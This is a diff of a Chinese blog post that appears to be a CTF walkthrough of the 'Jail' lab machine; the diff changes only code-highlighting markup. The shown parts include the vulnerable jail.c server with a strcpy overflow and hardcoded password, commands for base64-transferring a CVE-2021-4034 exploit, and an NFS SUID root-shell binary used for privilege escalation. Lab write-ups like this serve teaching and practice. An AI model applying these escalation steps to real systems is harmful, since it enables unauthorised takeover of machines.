@@ -250,171 +250,171 @@ PORT      STATE SERVICE    VERSION
 <p>但是<code>-z execstack</code> 禁用了数据区执行保护 (DEP)，也就是说如果jail.c的逻辑存在溢出问题，可以执行恶意指令。</p>
 <p>那目标明确，接下来重点分析jail的源代码</p>
 <p>jail.c</p>
-<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#include &lt;stdio.h></span>
-<span class="token comment" spellcheck="true">#include &lt;stdlib.h></span>
-<span class="token comment" spellcheck="true">#include &lt;netdb.h></span>
-<span class="token comment" spellcheck="true">#include &lt;netinet/in.h></span>
-<span class="token comment" spellcheck="true">#include &lt;string.h></span>
-<span class="token comment" spellcheck="true">#include &lt;unistd.h></span>
-<span class="token comment" spellcheck="true">#include &lt;time.h></span>
+<pre class="line-numbers language-C"><code class="language-C">#include <stdio.h>
+#include <stdlib.h>
+#include <netdb.h>
+#include <netinet/in.h>
+#include <string.h>
+#include <unistd.h>
+#include <time.h>
 
-int debugmode<span class="token punctuation">;</span>
-int handle<span class="token punctuation">(</span>int sock<span class="token punctuation">)</span><span class="token punctuation">;</span>
-int auth<span class="token punctuation">(</span>char *username, char *password<span class="token punctuation">)</span><span class="token punctuation">;</span>
+int debugmode;
+int handle(int sock);
+int auth(char *username, char *password);
 
-int auth<span class="token punctuation">(</span>char *username, char *password<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
-    char userpass<span class="token punctuation">[</span>16<span class="token punctuation">]</span><span class="token punctuation">;</span>
-    char *response<span class="token punctuation">;</span>
-    <span class="token keyword">if</span> <span class="token punctuation">(</span>debugmode <span class="token operator">==</span> 1<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
-        printf<span class="token punctuation">(</span><span class="token string">"Debug: userpass buffer @ %p\n"</span>, userpass<span class="token punctuation">)</span><span class="token punctuation">;</span>
-        fflush<span class="token punctuation">(</span>stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
-    <span class="token keyword">if</span> <span class="token punctuation">(</span>strcmp<span class="token punctuation">(</span>username, <span class="token string">"admin"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> 0<span class="token punctuation">)</span> <span class="token keyword">return</span> 0<span class="token punctuation">;</span>
-    strcpy<span class="token punctuation">(</span>userpass, password<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">if</span> <span class="token punctuation">(</span>strcmp<span class="token punctuation">(</span>userpass, <span class="token string">"1974jailbreak!"</span><span class="token punctuation">)</span> <span class="token operator">==</span> 0<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
-        <span class="token keyword">return</span> 1<span class="token punctuation">;</span>
-    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125; else &amp;#123;</span>
-        printf<span class="token punctuation">(</span><span class="token string">"Incorrect username and/or password.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token keyword">return</span> 0<span class="token punctuation">;</span>
-    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
-    <span class="token keyword">return</span> 0<span class="token punctuation">;</span>
-<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
+int auth(char *username, char *password) &#123;
+    char userpass[16];
+    char *response;
+    if (debugmode == 1) &#123;
+        printf("Debug: userpass buffer @ %p\n", userpass);
+        fflush(stdout);
+    &#125;
+    if (strcmp(username, "admin") != 0) return 0;
+    strcpy(userpass, password);
+    if (strcmp(userpass, "1974jailbreak!") == 0) &#123;
+        return 1;
+    &#125; else &#123;
+        printf("Incorrect username and/or password.\n");
+        return 0;
+    &#125;
+    return 0;
+&#125;
 
-int handle<span class="token punctuation">(</span>int sock<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
-    int n<span class="token punctuation">;</span>
-    int gotuser <span class="token operator">=</span> 0<span class="token punctuation">;</span>
-    int gotpass <span class="token operator">=</span> 0<span class="token punctuation">;</span>
-    char buffer<span class="token punctuation">[</span>1024<span class="token punctuation">]</span><span class="token punctuation">;</span>
-    char strchr<span class="token punctuation">[</span>2<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"\n\x00"</span><span class="token punctuation">;</span>
-    char *token<span class="token punctuation">;</span>
-    char username<span class="token punctuation">[</span>256<span class="token punctuation">]</span><span class="token punctuation">;</span>
-    char password<span class="token punctuation">[</span>256<span class="token punctuation">]</span><span class="token punctuation">;</span>
-    debugmode <span class="token operator">=</span> 0<span class="token punctuation">;</span>
-    memset<span class="token punctuation">(</span>buffer, 0, 256<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    dup2<span class="token punctuation">(</span>sock, STDOUT_FILENO<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    dup2<span class="token punctuation">(</span>sock, STDERR_FILENO<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    printf<span class="token punctuation">(</span><span class="token string">"OK Ready. Send USER command.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    fflush<span class="token punctuation">(</span>stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    while<span class="token punctuation">(</span>1<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
-        n <span class="token operator">=</span> read<span class="token punctuation">(</span>sock, buffer, 1024<span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">&lt;</span> 0<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
-            perror<span class="token punctuation">(</span><span class="token string">"ERROR reading from socket"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token keyword">return</span> 0<span class="token punctuation">;</span>
-        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
-        token <span class="token operator">=</span> strtok<span class="token punctuation">(</span>buffer, strchr<span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token keyword">while</span> <span class="token punctuation">(</span>token <span class="token operator">!=</span> NULL<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
-            <span class="token keyword">if</span> <span class="token punctuation">(</span>gotuser <span class="token operator">==</span> 1 <span class="token operator">&amp;&amp;</span> gotpass <span class="token operator">==</span> 1<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
-                <span class="token keyword">break</span><span class="token punctuation">;</span>
-            <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
-            <span class="token keyword">if</span> <span class="token punctuation">(</span>strncmp<span class="token punctuation">(</span>token, <span class="token string">"USER "</span>, 5<span class="token punctuation">)</span> <span class="token operator">==</span> 0<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
-                strncpy<span class="token punctuation">(</span>username, token+5, sizeof<span class="token punctuation">(</span>username<span class="token punctuation">))</span><span class="token punctuation">;</span>
-                gotuser<span class="token operator">=</span>1<span class="token punctuation">;</span>
-                <span class="token keyword">if</span> <span class="token punctuation">(</span>gotpass <span class="token operator">==</span> 0<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
-                    printf<span class="token punctuation">(</span><span class="token string">"OK Send PASS command.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-                    fflush<span class="token punctuation">(</span>stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>
-                <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
-            <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125; else if (strncmp(token, "PASS ", 5) == 0) &amp;#123;</span>
-                strncpy<span class="token punctuation">(</span>password, token+5, sizeof<span class="token punctuation">(</span>password<span class="token punctuation">))</span><span class="token punctuation">;</span>
-                gotpass<span class="token operator">=</span>1<span class="token punctuation">;</span>
-                <span class="token keyword">if</span> <span class="token punctuation">(</span>gotuser <span class="token operator">==</span> 0<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
-                    printf<span class="token punctuation">(</span><span class="token string">"OK Send USER command.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-                    fflush<span class="token punctuation">(</span>stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>
-                <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
-            <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125; else if (strncmp(token, "DEBUG", 5) == 0) &amp;#123;</span>
-                <span class="token keyword">if</span> <span class="token punctuation">(</span>debugmode <span class="token operator">==</span> 0<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
-                    debugmode <span class="token operator">=</span> 1<span class="token punctuation">;</span>
-                    printf<span class="token punctuation">(</span><span class="token string">"OK DEBUG mode on.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-                    fflush<span class="token punctuation">(</span>stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>
-                <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125; else if (debugmode == 1) &amp;#123;</span>
-                    debugmode <span class="token operator">=</span> 0<span class="token punctuation">;</span>
-                    printf<span class="token punctuation">(</span><span class="token string">"OK DEBUG mode off.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-                    fflush<span class="token punctuation">(</span>stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>
-                <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
-            <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
-            token <span class="token operator">=</span> strtok<span class="token punctuation">(</span>NULL, strchr<span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
-        <span class="token keyword">if</span> <span class="token punctuation">(</span>gotuser <span class="token operator">==</span> 1 <span class="token operator">&amp;&amp;</span> gotpass <span class="token operator">==</span> 1<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
-            <span class="token keyword">break</span><span class="token punctuation">;</span>
-        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
-    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
-    <span class="token keyword">if</span> <span class="token punctuation">(</span>auth<span class="token punctuation">(</span>username, password<span class="token punctuation">))</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
-        printf<span class="token punctuation">(</span><span class="token string">"OK Authentication success. Send command.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        fflush<span class="token punctuation">(</span>stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>
-        n <span class="token operator">=</span> read<span class="token punctuation">(</span>sock, buffer, 1024<span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">&lt;</span> 0<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
-            perror<span class="token punctuation">(</span><span class="token string">"Socket read error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token keyword">return</span> 0<span class="token punctuation">;</span>
-        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
-        <span class="token keyword">if</span> <span class="token punctuation">(</span>strncmp<span class="token punctuation">(</span>buffer, <span class="token string">"OPEN"</span>, 4<span class="token punctuation">)</span> <span class="token operator">==</span> 0<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
-            printf<span class="token punctuation">(</span><span class="token string">"OK Jail doors opened."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            fflush<span class="token punctuation">(</span>stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125; else if (strncmp(buffer, "CLOSE", 5) == 0) &amp;#123;</span>
-            printf<span class="token punctuation">(</span><span class="token string">"OK Jail doors closed."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            fflush<span class="token punctuation">(</span>stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125; else &amp;#123;</span>
-            printf<span class="token punctuation">(</span><span class="token string">"ERR Invalid command.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            fflush<span class="token punctuation">(</span>stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token keyword">return</span> 1<span class="token punctuation">;</span>
-        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
-    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125; else &amp;#123;</span>
-        printf<span class="token punctuation">(</span><span class="token string">"ERR Authentication failed.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        fflush<span class="token punctuation">(</span>stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token keyword">return</span> 0<span class="token punctuation">;</span>
-    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
-    <span class="token keyword">return</span> 0<span class="token punctuation">;</span>
-<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
+int handle(int sock) &#123;
+    int n;
+    int gotuser = 0;
+    int gotpass = 0;
+    char buffer[1024];
+    char strchr[2] = "\n\x00";
+    char *token;
+    char username[256];
+    char password[256];
+    debugmode = 0;
+    memset(buffer, 0, 256);
+    dup2(sock, STDOUT_FILENO);
+    dup2(sock, STDERR_FILENO);
+    printf("OK Ready. Send USER command.\n");
+    fflush(stdout);
+    while(1) &#123;
+        n = read(sock, buffer, 1024);
+        if (n < 0) &#123;
+            perror("ERROR reading from socket");
+            return 0;
+        &#125;
+        token = strtok(buffer, strchr);
+        while (token != NULL) &#123;
+            if (gotuser == 1 && gotpass == 1) &#123;
+                break;
+            &#125;
+            if (strncmp(token, "USER ", 5) == 0) &#123;
+                strncpy(username, token+5, sizeof(username));
+                gotuser=1;
+                if (gotpass == 0) &#123;
+                    printf("OK Send PASS command.\n");
+                    fflush(stdout);
+                &#125;
+            &#125; else if (strncmp(token, "PASS ", 5) == 0) &#123;
+                strncpy(password, token+5, sizeof(password));
+                gotpass=1;
+                if (gotuser == 0) &#123;
+                    printf("OK Send USER command.\n");
+                    fflush(stdout);
+                &#125;
+            &#125; else if (strncmp(token, "DEBUG", 5) == 0) &#123;
+                if (debugmode == 0) &#123;
+                    debugmode = 1;
+                    printf("OK DEBUG mode on.\n");
+                    fflush(stdout);
+                &#125; else if (debugmode == 1) &#123;
+                    debugmode = 0;
+                    printf("OK DEBUG mode off.\n");
+                    fflush(stdout);
+                &#125;
+            &#125;
+            token = strtok(NULL, strchr);
+        &#125;
+        if (gotuser == 1 && gotpass == 1) &#123;
+            break;
+        &#125;
+    &#125;
+    if (auth(username, password)) &#123;
+        printf("OK Authentication success. Send command.\n");
+        fflush(stdout);
+        n = read(sock, buffer, 1024);
+        if (n < 0) &#123;
+            perror("Socket read error");
+            return 0;
+        &#125;
+        if (strncmp(buffer, "OPEN", 4) == 0) &#123;
+            printf("OK Jail doors opened.");
+            fflush(stdout);
+        &#125; else if (strncmp(buffer, "CLOSE", 5) == 0) &#123;
+            printf("OK Jail doors closed.");
+            fflush(stdout);
+        &#125; else &#123;
+            printf("ERR Invalid command.\n");
+            fflush(stdout);
+            return 1;
+        &#125;
+    &#125; else &#123;
+        printf("ERR Authentication failed.\n");
+        fflush(stdout);
+        return 0;
+    &#125;
+    return 0;
+&#125;
 
-int main<span class="token punctuation">(</span>int argc, char *argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
-    int sockfd<span class="token punctuation">;</span>
-    int newsockfd<span class="token punctuation">;</span>
-    int port<span class="token punctuation">;</span>
-    int clientlen<span class="token punctuation">;</span>
-    char buffer<span class="token punctuation">[</span>256<span class="token punctuation">]</span><span class="token punctuation">;</span>
-    struct sockaddr_in server_addr<span class="token punctuation">;</span>
-    struct sockaddr_in client_addr<span class="token punctuation">;</span>
-    int n<span class="token punctuation">;</span>
-    int pid<span class="token punctuation">;</span>
-    int sockyes<span class="token punctuation">;</span>
-    sockyes <span class="token operator">=</span> 1<span class="token punctuation">;</span>
-    sockfd <span class="token operator">=</span> socket<span class="token punctuation">(</span>AF_INET, SOCK_STREAM, 0<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">if</span> <span class="token punctuation">(</span>sockfd <span class="token operator">&lt;</span> 0<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
-        perror<span class="token punctuation">(</span><span class="token string">"Socket error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        exit<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
-    <span class="token keyword">if</span> <span class="token punctuation">(</span>setsockopt<span class="token punctuation">(</span>sockfd, SOL_SOCKET, SO_REUSEADDR, <span class="token operator">&amp;</span>sockyes, sizeof<span class="token punctuation">(</span>int<span class="token punctuation">))</span> <span class="token operator">==</span> -1<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
-        perror<span class="token punctuation">(</span><span class="token string">"Setsockopt error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        exit<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
-    memset<span class="token variable"><span class="token punctuation">((</span>char<span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>server_addr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> sizeof<span class="token punctuation">(</span>server_addr<span class="token punctuation">))</span></span><span class="token punctuation">;</span>
-    port <span class="token operator">=</span> 7411<span class="token punctuation">;</span>
-    server_addr.sin_family <span class="token operator">=</span> AF_INET<span class="token punctuation">;</span>
-    server_addr.sin_addr.s_addr <span class="token operator">=</span> INADDR_ANY<span class="token punctuation">;</span>
-    server_addr.sin_port <span class="token operator">=</span> htons<span class="token punctuation">(</span>port<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">if</span> <span class="token punctuation">(</span>bind<span class="token punctuation">(</span>sockfd, <span class="token punctuation">(</span>struct sockaddr*<span class="token punctuation">)</span><span class="token operator">&amp;</span>server_addr, sizeof<span class="token punctuation">(</span>server_addr<span class="token punctuation">))</span> <span class="token operator">&lt;</span> 0<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
-        perror<span class="token punctuation">(</span><span class="token string">"Bind error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        exit<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
-    listen<span class="token punctuation">(</span>sockfd, 200<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    clientlen <span class="token operator">=</span> sizeof<span class="token punctuation">(</span>client_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">while</span> <span class="token punctuation">(</span>1<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
-        newsockfd <span class="token operator">=</span> accept<span class="token punctuation">(</span>sockfd, <span class="token punctuation">(</span>struct sockaddr*<span class="token punctuation">)</span><span class="token operator">&amp;</span>client_addr, <span class="token operator">&amp;</span>clientlen<span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token keyword">if</span> <span class="token punctuation">(</span>newsockfd <span class="token operator">&lt;</span> 0<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
-            perror<span class="token punctuation">(</span><span class="token string">"Accept error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            exit<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
-        pid <span class="token operator">=</span> fork<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token keyword">if</span> <span class="token punctuation">(</span>pid <span class="token operator">&lt;</span> 0<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
-            perror<span class="token punctuation">(</span><span class="token string">"Fork error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            exit<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
-        <span class="token keyword">if</span> <span class="token punctuation">(</span>pid <span class="token operator">==</span> 0<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
-            close<span class="token punctuation">(</span>sockfd<span class="token punctuation">)</span><span class="token punctuation">;</span>
-            exit<span class="token punctuation">(</span>handle<span class="token punctuation">(</span>newsockfd<span class="token punctuation">))</span><span class="token punctuation">;</span>
-        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125; else &amp;#123;</span>
-            close<span class="token punctuation">(</span>newsockfd<span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
-    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
-<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
+int main(int argc, char *argv[]) &#123;
+    int sockfd;
+    int newsockfd;
+    int port;
+    int clientlen;
+    char buffer[256];
+    struct sockaddr_in server_addr;
+    struct sockaddr_in client_addr;
+    int n;
+    int pid;
+    int sockyes;
+    sockyes = 1;
+    sockfd = socket(AF_INET, SOCK_STREAM, 0);
+    if (sockfd < 0) &#123;
+        perror("Socket error");
+        exit(1);
+    &#125;
+    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &sockyes, sizeof(int)) == -1) &#123;
+        perror("Setsockopt error");
+        exit(1);
+    &#125;
+    memset((char*)&server_addr, 0, sizeof(server_addr));
+    port = 7411;
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_addr.s_addr = INADDR_ANY;
+    server_addr.sin_port = htons(port);
+    if (bind(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) &#123;
+        perror("Bind error");
+        exit(1);
+    &#125;
+    listen(sockfd, 200);
+    clientlen = sizeof(client_addr);
+    while (1) &#123;
+        newsockfd = accept(sockfd, (struct sockaddr*)&client_addr, &clientlen);
+        if (newsockfd < 0) &#123;
+            perror("Accept error");
+            exit(1);
+        &#125;
+        pid = fork();
+        if (pid < 0) &#123;
+            perror("Fork error");
+            exit(1);
+        &#125;
+        if (pid == 0) &#123;
+            close(sockfd);
+            exit(handle(newsockfd));
+        &#125; else &#123;
+            close(newsockfd);
+        &#125;
+    &#125;
+&#125;
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h3 id="代码分析："><a href="#代码分析：" class="headerlink" title="代码分析："></a>代码分析：</h3><p>建立了一个套接字，<code>AF_INET</code>(ipv4),<code>SOCK_STREAM</code>(tcp连接)，等会用<code>nc</code>作为客户端交互就行</p>
 <p><img src="/2022/08/22/Jail/image/image_hCx_OJTAS-.png"></p>
@@ -514,11 +514,11 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
 <p>本来想curl传脚本过去，但是好像超时了，不给访问网络，不知道是有策略还是什么原因</p>
 <p>所以直接写</p>
 <p><a target="_blank" rel="noopener" href="https://github.com/dadvlingd/-CVE-2021-4034">https://github.com/dadvlingd/-CVE-2021-4034</a></p>
-<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cat</span> CVE-2021-4034-py2.py <span class="token operator">|</span>base64
+<pre class="line-numbers language-TEXT"><code class="language-TEXT">cat CVE-2021-4034-py2.py |base64
 
-<span class="token keyword">echo</span> <span class="token string">'&amp;#123;编码后的内容&amp;#125;'</span> <span class="token operator">></span>/tmp/pk_base64
+echo '&#123;编码后的内容&#125;' >/tmp/pk_base64
 
-<span class="token function">cat</span> /tmp/pk_base64<span class="token operator">|</span>base64 -d <span class="token operator">></span>/tmp/pk.py
+cat /tmp/pk_base64|base64 -d >/tmp/pk.py
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><img src="/2022/08/22/Jail/image/image_jmAq2qPFMX.png"></p>
 <p>=&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p>
@@ -571,19 +571,19 @@ no_all_squash（默认）：访问用户先与本机用户匹配，匹配失败�
 <p>因为设置了<code>suid</code>位的进程在执行的时候，拥有的权限是进程本身的属主权限，而不是执行的发起者</p>
 <p>，在执行过程中，调用者会暂时获得该文件的所有者权限</p>
 <p>意思就是<code>uid_1000_sh</code> 的文件所有者是<code>frank</code> ，当<code>uid_1000_sh</code>设置了<code>suid</code>位，用<code>nobody</code> 去执行<code>uid_1000_sh</code> 的时候，<code>uid_1000_sh</code> 会以<code>frank</code> 权限被执行，这样就可以导致提权。</p>
-<pre class="line-numbers language-bash"><code class="language-bash">frank@kali:/tmp$ <span class="token function">cat</span> uid_1000_bash.c
-<span class="token comment" spellcheck="true">#define _GNU_SOURCE</span>
-<span class="token comment" spellcheck="true">#include &lt;stdlib.h></span>
-<span class="token comment" spellcheck="true">#include &lt;unistd.h></span>
+<pre class="line-numbers language-C"><code class="language-C">frank@kali:/tmp$ cat uid_1000_bash.c
+#define _GNU_SOURCE
+#include <stdlib.h>
+#include <unistd.h>
 
-int main<span class="token punctuation">(</span>void<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
-    setresuid<span class="token punctuation">(</span>1000, 1000, 1000<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    system<span class="token punctuation">(</span><span class="token string">"/bin/bash"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">return</span> 0<span class="token punctuation">;</span>
-<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
+int main(void) &#123;
+    setresuid(1000, 1000, 1000);
+    system("/bin/bash");
+    return 0;
+&#125;
 
 frank@kali:/tmp$ gcc -m32 uid_1000_bash.c -o /mnt/nfsshare/uid_1000_bash
-frank@kali:/tmp$ <span class="token function">chmod</span> 7777 /mnt/nfsshare/uid_1000_bash
+frank@kali:/tmp$ chmod 7777 /mnt/nfsshare/uid_1000_bash
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><code>nobody</code> 上执行后成功提权到<code>frank</code></p>
 <pre class="line-numbers language-bash"><code class="language-bash">script /dev/null
